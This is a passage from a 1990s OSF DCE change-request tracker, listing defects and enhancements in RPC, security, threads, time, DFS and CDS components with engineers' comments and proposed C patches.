slower than the network IO). The receiver thread queues a fragment buffer
onto assoc->msg_list as fast as possible. However, since the dequeueing
thread takes more time to process fragment buffers, the message queue gets
longer and longer, and eventually the client machine run out of the swap
space.
 
There needs to be a maximum queue length enforced on the association's
message queue, and when it reaches the max length, the receiver thread
should stop calling recvmsg() so that the underlying protocol's (TCP/IP)
flow control takes effect. This sounds simple. However, we need to consider
the special cases like the fault, quit, remote alert, orphaned, etc. PDUs.
Even though the message queue is full, the receiver thread should process
these packets as soon as possible. The use of the out-of-band data is a
possible solution, but it requires the protocol change and the OOB may not
be supported on the other CN protocols. (Well, we can simply ignore the
special cases, though.)

[markar 11/3/93 public] 
 
This is a generic problem with the way CN handles bulk data transfers;
it's not specific to pipes.

[11/04/93 public]
Is this really an A1 defect?
Didn't anyone think about this when they designed it?  (sigh)
Defering to 1.1

[8/22/94 public]
Unfortunately, this has fallen off the plate for 1.1 and I am defering
it to 1.2.  We do not have the time to engineer a solution
to this problem for 1.1.
Lowering this to a B2 enhancement.

[10/6/94 public]
I hope this doesn't get me into lots of trouble...
 
This may not be an A1, it may be deferred, but it's a solid B2 with no
work-around, and it causes a core dump or worse; I have trouble seeing
it as an enhancement.

[4/19/96 public]

Another bad instance of this defect. Consider the server servicing IN-pipe.
The CN receiver thread never stop reading fragments when the call is queued
because of busy call executor threads. So, nobody dequeues fragment
buffers. Well, if you are doing heavy bulk data transfers, you'd better use
DG...



CR Number                     : 9335
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : secd
Short Description             : secd should check all alias accounts on replace/add
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.2
Found Date                    : 11/3/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/server/rs/rs_pwd.c
Sensitivity                   : public

[11/3/93 public]

Operations which involve changing or replacing accounts do not always
work with alias accounts. This is because secd looks up the account
based on the UUID. Since alias accounts of a primary account share the
same UUID, the lookup returns the primary account instead of the
alias account and subsequent checks (decryption, key versioning) fail.

The fix is to have rs_pwd_get_key_by_prnc() check all aliases of the
primary account and only return failure if all accounts fail. 

To reproduce, create an alias account and then do the following in
rgy_edit :

rgy_edit=> kta -p alias -r -a
?(rgy_edit) Unable to add key - key version number out of range (dce / sec)

This is because the primary account was looked up and the key versions
did not match with the alias account.

Fix is available. Will put in for 1.1.

[8/1/94 public]

Tried "kta -p alias -r -a" on alias account but it still fails (hp800).
On the other hand it fails for normal accounts too.

[8/9/94 public]
Max, please update this CR with the error messages that it failed with in
both cases.  The statement that it fails for normal accounts too is
particularly troubling, since if that fails then dce_config could not possibly
succeed.



CR Number                     : 9334
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : CMA does not handle EAGAIN
from select/poll
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.3
Found Date                    : 11/3/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/3/93 public]

Licensee reported:

" select(3C) on AIX and poll(2) on SVR4 can return EAGAIN when
  system, under stress, runs out of memory resources. This happened
  on penguin ( FTX machine ) - I was able to verify from crash(1M)
  that some kernel memory allocation failed. From secd core dump
  below it seems to have died under these conditions.

# sdb /opt/dcelocal/bin/secd core
no source file
0x8101ca58   (_kill+0x8)                bc      12865 <81029360>  [_cerror]
*t
_kill()
cma__abort_process(abort_signal=6)      [cma_signal.c:885]
cma__bugcheck(text="cma__io_available: unexpected select error")  [cma_errors.c:299]
cma__io_available(function=cma__c_io_read,fd=0,timeout=0xefcc4)   [cma_thread_io.c:789]
cma___null_thread()     [cma_dispatch.c:2406]
cma__thread_base()      [cma_thread.c:1381]
*errno
Assuming :errno is int
:errno/0xb


Repeat By:

Proposed Solution:

        Two options exist.

        - One is to have the operation retried, in the hope that the
          condition is temporary.

        - The other is to leave it the way it is - because retrying
          may exacerbate the situation and the system could take longer
          to recover.

        I'd recommend the first option, as this condition will be
        noticed outside of CMA, which I think is a better place
        to handle the situation and perhaps gracefully shutdown.
"



CR Number                     : 9329
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : security
Short Description             : redefinition of macros in
param.h cause compilation failures
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.3
Found Date                    : 11/3/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/3/93 public]

Licensee reported:

"Redefintion of the macros MIN and MAX, provided in sys/param.h, cause
 compilation failures.  In the following cases, this is caused by the
 inclusion of macros.h before sys/param.h

        src/security


                server/rs/rs_rep_auth.c : macros.h via rgymacro.h via
                                                rs_base.h via rs_server.h

                        and sys/param.h via sec_login_file_loc.h via
                                sec_login_pvt.h

                client/login/sec_login_util.c: macros.h via rgymacro.h
                        param.h via sec_login_file_loc.h via sec_login_pvt.h

                client/login/sec_login_cache.c : same as last case
"

Verified with OSF/1 include files for 1.0.3.

Since the definition in sys/param.h does not have a #ifdef to wrap and the 
defintion in macros.h does have #ifdef wrap, the suggested fix is to
include <sec_login_pvt.h> in front of rgymacros.h.

[8/23/94]

I have seen the warnings.  In dce1.1 the above solution will not
suffice as MAX and MIN are defined in dce.h
Two solutions are possible.
1 Include sys/param.h in dce.h
2 Check all the files that cause the warning and explicitly include
  sys/param.h before any dce header file.  This will do as sys/param.h
  is multiple-inclusion safe.

[8/23/94 public]
Choice 1 isn't good since dce.h is included by virtually every DCE file and
many DCE application files.  Many that don't need param.h

Choice 2 isn't bad.

NOTE: the original CR said failures, and I would question how this could be
verified on OSF/1.  These files build on OSF/1.  Max's comment that they
generate warnings makes sense.  If this is the case, since it's warnings,
and it's not a trival one character fix (:-), and 1.1 is on a very tight
schedule, I would defer this.  

This is in violation of the coding style guide (we are supposed to compile
cleanly on the reference platforms), but the easy out is to "mention it in
the porting guide".  A simple note that says "we see these warnings in these
files on this platform" is enough to get you pass the code cleanup
requirements.



CR Number                     : 9303
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : dfs_config is missing log messages.
Reported Date                 : 11/1/93
Found in Baseline             : 1.0.3
Found Date                    : 11/1/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/1/93 public]

Someone put a whole bunch of code in the config_dfsfldb function without
log messages.  Due to the wonders of ODE, I can't quite figure out who did
it, but it might have been Tom Jordahl.  We happen to be having some
trouble with this area of the code and it is annoying not to have the log
messages to see exactly what is going on.

[11/01/93 public]
Wan't me, and besides, whatever logging there is or is not in dfs_config
came from HP.  (Check with Jack Danahy)

[12/29/93 public]
Re-assign to Andy Mckeen.



CR Number                     : 9281
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : cma__int_cond_delete macro should not return
Reported Date                 : 10/28/93
Found in Baseline             : 1.0.3
Found Date                    : 10/28/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/threads/cma_condition.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/28/93 public]

The cma__int_cond_delete macro contains a return without a return value.
This macro is used by two functions and 1 proceedure. In the case of the
functions, pthread_cond_destroy and ptdexc_cond_destroy, execution of the
return statement in the macro, will cause an unspecified return value
to be seen by the caller.

Proposed solution:

The return statement should be eliminated from the macro. The following
modification will correct the problem and allow the existing uses of the
macro to remain unchanged.

     ***************
     *** 343,358 ****
        *       none
        */
       #define cma__int_cond_delete(_condition_) { \
           cma__t_int_cv       *_int_cv_; \
           (_int_cv_) = cma__validate_null_cv (_condition_); \
     !     if ((_int_cv_) == (cma__t_int_cv *)cma_c_null_ptr) \
     !         return; \
     !     if (cma__cv_waiting ((_condition_))) \
     !         cma__error (cma_s_in_use); \
     !     cma__free_cv (_int_cv_); \
     !     cma__clear_handle (_condition_); \
           }
       ^L
       /*
        *  FUNCTIONAL DESCRIPTION:
        *
     --- 343,358 ----
        *       none
        */
       #define cma__int_cond_delete(_condition_) { \
           cma__t_int_cv       *_int_cv_; \
           (_int_cv_) = cma__validate_null_cv (_condition_); \
     !     if ((_int_cv_) != (cma__t_int_cv *)cma_c_null_ptr) { \
     !  if (cma__cv_waiting ((_condition_))) \
     !          cma__error (cma_s_in_use); \
     !  cma__free_cv (_int_cv_); \
     !  cma__clear_handle (_condition_); \
     !  }       \
           }
       ^L
       /*
        *  FUNCTIONAL DESCRIPTION:
        *



CR Number                     : 9280
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : 
Short Description             : if _CMA_THREAD_IS_VP_ cma__int_make_thread does not int mem from cma__alloc_object
Reported Date                 : 10/28/93
Found in Baseline             : 1.0.3
Found Date                    : 10/28/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cma_thread.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/28/93 public]

if _CMA_THREAD_IS_VP_ cma__int_make_thread calls cma__alloc_object to
allocate a cma__t_vp structure. However, cma__int_make_thread neglects
to initialize the contents of the returned structure. This leads to some
very weird results when later code concludes that the garbage values in
the structures are queue pointers or vp_id's.

Proposed solution:

     * Create a runnable thread:  Initialize the stack and context, and
     * notify the scheduler
     */
#if _CMA_THREAD_IS_VP_
    /*
     * If we have kernel threads, and we're enforcing one-to-one mapping,
     * then create a new VP for the thread.
     */
    if ((cma_t_address)tcb->sched.processor == cma_c_null_ptr) {
	vp = cma__alloc_object (cma__t_vp);

	if ((cma_t_address)vp == cma_c_null_ptr)
	    return cma_c_false;

     +  vp->current_thread = NULL;
     +  vp->vp_id = 0;
     +  cma__queue_zero(&vp->interrupts);
     +
	tcb->sched.processor = vp;
	}
    else



CR Number                     : 9278
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : 
Short Description             : prvb_thd_006 hangs on kernel threads
Reported Date                 : 10/27/93
Found in Baseline             : 1.0.3
Found Date                    : 10/27/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cma_condition.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/93 public]

They are porting DCE threads to OSF1 kernel threads, and reported a
hang in prvb_thd_006. They traced the problem to the misordering
of the unlock and enter kernel calls in cma__wait (cma__timed_wait
also unlocks the mutex before entering the kernel). These calls are
apparently reversed in order to prevent a deadlock related to the
enter kerenel (the unlock call will default to a NOOP if called
after the enter_kernel. The result is that a window of opportunity
is opened in which a thread which has committed to wait on a condition
variable can be interrupted by another thread which signals the condition
variable. In an early implementation of threads, this last minute signal
would not be percieved by the waiter, it would proceed to wait in some
cases never to awaken again. To correct for this problem, the nopending
bit was added which is basically a last chance for the about to wait
thread to reconsider it's decision to wait. If this bit is cleared, it
means that a late arriving signal did arrive, and the thread should
not wait.

Given this background, this OT is being written to make two points.

1. OSF should take the time to make DCE threads work on OSF1
   kernel threads. Some of the threads code is partially set up
   to build for kernel threads based on compile time constants
   documented in the porting and testing guide. We should probably
   follow through on this ourselves. The porting and testing guide
   should give better guidance as to how to do this. In particular,
   we probably want to recommend that someone trying to run DCE
   on kernel threads, get at the kernel threads via the pthread
   interface, without any effort at porting DCE user space threads
   into the kernel. This is in constrast to the strategy implied
   by the compiler constants described in the porting and
   testing guide.

2. Although I haven't been able to prove it, the nopending bit
   functionality is not robust enough to correct for the race
   condition introduced by the misordering of the unlock and
   enter_kernel operations of cma__wait (I don't think it can
   deal with more than one waiter being interrupted in the
   race area; a rare but possible scenario). The threads package
   should be modified to eliminate this race condition and
   obviate the need for the nopending hack and it's consequences
   (including the infamous spurios wakeup).



CR Number                     : 9268
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : RPC_DEFAULT_ENTRY should default to "/.:/cell-profile"
Reported Date                 : 10/26/93
Found in Baseline             : 1.0.2
Found Date                    : 10/26/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/26/93 public]

Rich makes an excellent suggestion in the following note in comp.unix.osf.misc:

From: rsalz@osf.org (Rich Salz)
Newsgroups: comp.unix.osf.misc
Subject: Re: Automatic Binding
Date: 22 Oct 1993 17:32:57 GMT
Organization: Open Software Foundation

In <1993Oct22.082304.9299@srd.bt.co.uk> smeek@jungle.bt.co.uk (Steve Meek) writes:
>Yes, yes I know that but doesn't it seem strange that in so called
>'automatic binding' you have to EXPLICITLY specify an entry to the CDS
>using RPC_DEFAULT_ENTRY!!

It does seem a bit strange.  I suppose it would not be unreasonable to
have RPC_DEFAULT_ENTRY default to "/.:/cell-profile"
	/r$

[05/04/94 public]
I don't think changing this would be such a hot idea.
Might take people by surprise, and I'm sure they wouldn't like
this sort of surprise.  RPC even gives you a reasonable error message
(something like 'you don't have the variable set')

Who would have permission to add entries to cell-profile?
Do we want just any application sticking its bindings in there?



CR Number                     : 9257
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : sec/utils
Short Description             : return within TRY-block (coding style)
Reported Date                 : 10/26/93
Found in Baseline             : 1.0.2
Found Date                    : 10/26/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : commands.c
Sensitivity                   : public

[10/26/93 public]
  There's a return from within a TRY-block in commands.c . Here, it
triggers a sanity-check about the mismatching of TRY/ENDTRY executions.
DCE documentation advocates that return's not be placed within TRY-blocks.
......................................................................
diff -c -t -b -r9.2 security/utils/commands.c
*** 9.2 1993/06/23 14:02:10
--- security/utils/commands.c   1993/10/25 22:07:47
***************
*** 335,351 ****
  {
      command_buf       c;
!
!     while (TRUE) {
          TRY {
              if (must_prompt) {
                  fputs(prompt_string, stdout);
              }
              get_command(&c);
!
!             if (c.done) {
!                 return;
!             }
              (*c.op)(&c);
          } CATCH_ALL {
          } ENDTRY
      }
--- 335,351 ----
  {
      command_buf       c;
!
!     c.done = FALSE;
!     while (!c.done) {
          TRY {
              if (must_prompt) {
                  fputs(prompt_string, stdout);
              }
              get_command(&c);
!
!             if (!c.done) {
                  (*c.op)(&c);
+             }
          } CATCH_ALL {
          } ENDTRY
      }

[10/28/93 public]
  Found six? more? instances of this in client/rca/sec_lrgy.c ...
Filled in Responsible Engr. with `sec_bat' 
Filled in Resp. Engr's Company with `hp'



CR Number                     : 9187
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dts
Subcomponent Name             : libutc
Short Description             : utc_asc*time rounds fractions of seconds incorrectly.
Reported Date                 : 10/18/93
Found in Baseline             : 1.0.3
Found Date                    : 10/18/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/18/93 public]
utc_ascanytime, utc_ascgmtime, utc_asclocaltime and utc_ascreltime
round up .9999 seconds (on either time or inaccuracy) incorrectly
to .1000 rather than incrementing by one second and setting the
fractional field to .000.
Test case:
#include <dce/utc.h>
main()
{
        utc_t   utc;
        char    timestr[UTC_MAX_STR_LEN];
        utc_mkasctime(&utc, "1993-10-14-15:15:15.9999-05:00I1.00");
        utc_ascanytime(timestr, UTC_MAX_STR_LEN, &utc);
        printf("utc_ascanytime: timestr = %s\n", timestr);
}

The error is in common/utc_cvt, where utc_asc*time does:
/* in utc_ascanytime */
    (void) sprintf(timestr,
                   "%04d-%02d-%02d-%02d:%02d:%02d.%03d",
                   tmTime.tm_year+1900,
                   ++tmTime.tm_mon,
                   tmTime.tm_mday,
                   tmTime.tm_hour,
                   tmTime.tm_min,
                   tmTime.tm_sec,
                   ((tns + K_NS_PER_MS/2)/K_NS_PER_MS));

(tns + K_NS_PER_MS/2)/K_NS_PER_MS will be 1000 if tns = .9999.

this could be fixed by something like :
/* in utc_ascanytime (fixes time part only) */
....
    struct utc tmputc, utc_1sec;
    reltimespec_t tm_1sec = {1, 0};
    timespec_t tzero = {0, 0};
....

    if ((tns = (tns + K_NS_PER_MS/2)/K_NS_PER_MS) >= 1000) {
        /* create a timestamp that represents 1 second */
        utc_mkbinreltime(&utc_1sec, &tm_1sec, &tzero);

	/* add 1 second to time */
        utc_addtime(&tmputc, utcTime, &utc_1sec);

        /* get tm struct again */
        utc_anytime(&tmTime, &tns, &tmInacc, &ins, &tdf, &tmputc);

        /* set fraction tns to zero */
        tns = 0;
    }
 
    (void) sprintf(timestr,
                   "%04d-%02d-%02d-%02d:%02d:%02d.%03d",
                   tmTime.tm_year+1900,
                   ++tmTime.tm_mon,
                   tmTime.tm_mday,
                   tmTime.tm_hour,
                   tmTime.tm_min,
                   tmTime.tm_sec,
                   tns);



CR Number                     : 9134
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8687
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dfs
Subcomponent Name             : 
Short Description             : problems with /.:
Reported Date                 : 10/15/93
Found in Baseline             : 1.0.2
Found Date                    : 10/15/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Status               : 

[10/15/93 public]
This is a place holder from CR 8687 discussing any new problems found from
the choice of /.: and /: as shorthand names for interactive use.  This CR
is being used as a place holder for all the information that has gone
around in some mail messages.  All discussions should take place here from
now on.
make has a problem (the dce make) when the current working directory has a
: in it.  The following is from Jim Wade:
  This problem appeared when make was using the
  pwd function to resolve the path of a source file from
  the backing tree.  It conflicted with the VPATH internal
  variable and when parsing the directory it hit the : and
  thought it was a seperator for another part of the VPATH
  and got very confused.
  
  This also will cause a problem on OS/2 systems since the
  ":" character is used as a drive seperator.  
  
  I was told at the time to use a symbolic link and not to 
  use "cd /:/project/dce/build" when building so that make
  would not mis-interpret the ":".  The ":" was not in the
  VPATH but was mis-interpreted when parsing the current
  path to resolve the link to a file.
  At no time did I use : in a path or put it in a Makefile.  The only thing
  I did was to "cd /:/project/dce/build/test" and try to build the system
  with ODE.  
Also the ksh problem seems to occur on a variety of systems (although
exactly which seems to be an issue).  It has been seen on AIX, HP/UX and
Solaris.  Again from Jim Wade:
  The ksh problem does occur on an AIX system.  The problem
  only seems to occur if you try to make a shell script 
  be executable with chmod and with the "#!/bin/ksh" variable
  as the first line.
  In the case of the ksh issue I tried to execute a ksh shell 
  script with "/.:/fs/foo.sh" or "/:/foo.sh" and the shell script was an
  executable script.
  The problem is not only with ksh on the HP platform but also on the AIX
  platform, otherwise I would not have raised the issue.  The problem comes
  when a shell script is exec'ed from the ksh the ksh uses the $PWD internal
  variable to pass to the exec system call so that exec() can find the
  path.  This may be particular to ksh but I would think that other user
  programs may do the same thing.  The reason that ksh does this is to 
  save time traversing the tree back to the root of the filesystem to
  find the real path to the program.
This is from Craig Everhart:
  FYI, ksh exhibits this property on Solaris as well.  On RS/6000, it
  works normally, but if I set an environment variable PWD to contain the
  working directory and if $PWD contains a colon, ksh fails (but sh and
  csh succeed).  Looks like a ksh bug to me, that it (and it alone)
  mis-interprets $PWD if $PWD contains a colon.
  
  I bet ksh would fail on OSF/1 or any other platform with a colon in
  $PWD, with or without DFS.  In fact, I just verified this on an Ultrix
  box.

[8/24/94 public]
I don't believe this is a Config problem, it is more importantly
a DFS issue.
If I recall, the OSF/1 team did warn the DCE team (correctly) about
using ':' in DFS pathnames.  The quote "..a really *BAD* idea." floats
in to my mind.
So moving this over to the dfs component and assigning it to Ron Arbo,
who I believe will be around for 1.2.

[8/31/94 public]
We ran into this during internal use at Transarc.  After some experimentation,
we found the ksh problem on our AIX boxes (AIX 3.2.?), but not on our
Solaris 2.3 boxes.  Perhaps Sun fixed their ksh between Solaris 2.2 and
Solaris 2.3?  I don't have HP/UX boxes running DFS available for this
experiment, but I tried it out on another file system.  I believe that the ksh
on our HP/UX (HP/UX 9.0) has a problem with :, but if the name containing
the : is a symbolic link, ksh does the right thing, and so it is possible
to run ksh scripts from DFS.  This summary of experimental results should be
taken with a grain of salt, since any new release or patch of an OS can bring
with it a new ksh.
.
Our particular situation was that we were trying to run one of OSF's system-test
scripts, src/test/systest/file/dfs.glue, under tcsh.  dfs.glue is a ksh script.
tcsh sets the PWD variable, and ksh gets confused by the setting.  Since this
problem makes AIX DFS "allergic" to ksh scripts, it seems imprudent to have
ksh scripts in the test suite, but I have to admit that nobody had considered
this a problem until now.
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `'

[9/2/94 public]
The work-around, as described above by Jim Wade, is to "use a symbolic link".
: and .: are, in fact, symbolic links, so the more accurate thing to say is
"use an alternate symbolic link".
.
Evidently, both cell administrators and individual workstation root users can
use this work-around.  I have observed this being done, as has Jim Wade.
.
The difference in this case between a work-around and a "fix" is that a "fix"
would involve adding support for alternate symbolic links in the configuration
scripts.  That is, additional symbolic links would be created at configuration
time.  The advantage of this would be the same as the advantage of creating
: and .:, namely, that it would be done automatically on every configured
workstation, rather than being left to human intervention.  All workstations
that used the same configuration script could be assured of having the same
symbolic links.
.
Since different vendors have gone their separate ways with configuration
scripts, it can no longer be guaranteed that a "fix" for this bug by OSF will
be propagated to all the relevant platforms.  However, it is clearly desirable
that cell administrators should be able to ensure that all workstations in a
cell use the same symbolic links, regardless of platform.  Thus, different
vendors may need to standardize to some degree, on the support provided for
alternate symbolic links.  This note is a reminder that Transarc is interested
in the outcome of OSF's deliberations on this problem.
Changed Interest List CC from `walt, dmackey, jwade@austin.ibm.com, 
 Craig_Everhart@transarc.com' to `walt, dmackey, jwade@austin.ibm.com, 
 Craig_Everhart@transarc.com, bwl@transarc.com'



CR Number                     : 9081
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : 
Short Description             : simplify UTCabsVal
Reported Date                 : 10/10/93
Found in Baseline             : 1.0.2
Found Date                    : 10/10/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : time/common/utc_arith.h
Sensitivity                   : public

[10/10/93 public]

The macro UTCabsVal should directly call UTCnegate instead of calling it
indirectly. This will avoid unnecessary allocation of automatic variables
and unnecessary operations.

Proposed Solution:

/*
 * UTCValue Absolute Value.  result = sub1 if sub1 is positive
 * or the absolute value of sub1 if it was negative.
 */
#define UTCabsVal(sub1,result)                  \
    {                                           \
        UTCValue _utcZero;                      \
        _utcZero.lo = _utcZero.hi = 0;          \
                                                \
        if ((sub1)->hi & 0x80000000)            \
           UTCsub(&_utcZero, (sub1), (result))  \
        else                                    \
           *(result) = *(sub1);                 \
    }

can be changed to:

/*
 * UTCValue Absolute Value.  result = sub1 if sub1 is positive
 * or the absolute value of sub1 if it was negative.
 */
#define UTCabsVal(sub1,result)                  \
    {                                           \
        if ((sub1)->hi & 0x80000000)            \
           UTCnegate((sub1), (result))  \
        else                                    \
           *(result) = *(sub1);                 \
    }



CR Number                     : 9079
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : binding
Short Description             : consolidate some of the sec_rgy_site_ API.
Reported Date                 : 10/9/93
Found in Baseline             : 1.0.2
Found Date                    : 10/9/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/9/93 public]

Following are the list of APIs that do more or less the same thing.  They
should be combined into one API.

	sec_rgy_site_open - Opens a registry site with default sec. level.
        	            (It does not take auth_info arg. unlike bind ver.)
	sec_rgy_site_open_query - same as sec_rgy_site_open.
	sec_rgy_site_open_update - opens the master registry site
	sec_rgy_site_bind - Opens a registry site with requested sec. level.
        	            It takes auth_info arg.
	sec_rgy_site_bind_query - same sec_rgy_site_bind.
	sec_rgy_site_bind_update - opens the master registry site. Takes
	                           auth_info arg.

All these API's could be combined into one API, let's call it:

        sec_rgy_site_get_handle(
                unsigned_char_t *site_name,
                sec_rgy_bind_auth_info_t *auth_info,
                unsigned8 site_type,
                sec_rgy_handle_t *context,
                error_status_t *status)

This has one extra parameter 'unsigned8 site_type' than what 'bind' type of
calls have. site_type could be one of the following:

	sec_c_site_query - get handle for a query site
	sec_c_site_update - get handle for a update site
	sec_c_site_any - don't care what type of site is bound to
	sec_c_site_default - may be we do not need this.

To get same behavior as 'open' type of calls, application can just pass
NULL for the auth_info argument.

AES/DC Security can make this new API as full-use and others temp. use.

[10/11/93 public]
There's no way that a functional change like this can be considered for 1.0.3,
so I've changed the requested fixby field to 1.1.



CR Number                     : 9052
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : cds
Subcomponent Name             : gda init_client()
Short Description             : search for dns server fails to default to localhost
Reported Date                 : 10/6/93
Found in Baseline             : 1.0.3
Found Date                    : 10/6/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/directory/cds/gda/gda_bind.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/6/93 public]

The init_client() routine in src/directory/cds/gda/gda_bind.c does
not find a dns server running on the localhost unless it is explicitly
mentioned in the gda configuration files.  Since this would normally
be the dns server of choice, it would be nice to automatically default
to localhost if no explicitly configured server is found.  The following
addition to init_client accomplishes this and has been tested on hppa/
hpux:

	(void) fclose(fp);

new>	if( nameser_list.head == (element_t *)NULL )
new>	{
new>		/* we haven't found anything yet, use localhost */
new>
new>		if((nameser = (rr_el_t *)malloc(sizeof(rr_el_t))) == NULL)
new>		{
new>			error_exit(INIT_CLIENT_FUNC, SEV_DEATH,
new>				MALLOC_ERR_ST, errno, "nameser malloc", -1);
new>		}
new>		ALLOC(rr_el_t, 8)
new>
new>		dotname_to_fullname(".", &nameser->dname_rr);
new>		nameser->class_rr = C_IN;
new>		nameser->auth_rr = 1;
new>		nameser->tag_rr = e_addr_nameserver;
new>
new>		nameser->rr.adns.mach_addr.sin_family = AF_INET;
new>		nameser->rr.adns.mach_addr.sin_addr.s_addr = (u_long)inet_addr("127.0.0.1");
new>		nameser->rr.adns.mach_addr.sin_port = ns_port;
new>		bcopy(&eight_zeros, nameser->rr.adns.mach_addr.sin_zero, 8);
new>
new>		nameser->rr.adns.auth = 1;
new>		nameser->rr.adns.used = 0;
new>		nameser->rr.adns.path = DATAGRAM;
new>
new>		if((status = l_insert_nl((char *)&nameser, &nameser_list,
new>			(element_t *)NULL)) != OK)
new>		{
new>			error_exit(INIT_SERVER_FUNC, SEV_DEATH,	L_INSERT_NL_ERR_ST,
new>				status,	"nameser l_insert_nl", -1);
new>		}
new>	}

	return (OK);



CR Number                     : 9048
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Sec_RepUUID converted to
string for stored as type byte in cds
Reported Date                 : 10/5/93
Found in Baseline             : 1.0.3
Found Date                    : 10/5/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/5/93 public]
The replica id is converted to a string then stored as a CDS
attribute of type byte.  An array of char and an array of byte are
not the same thing, although since the uuid is a numeric string
you probably don't have ascii/ebcidic problems.  But, cdscp
cannot display the attribute intellegently.

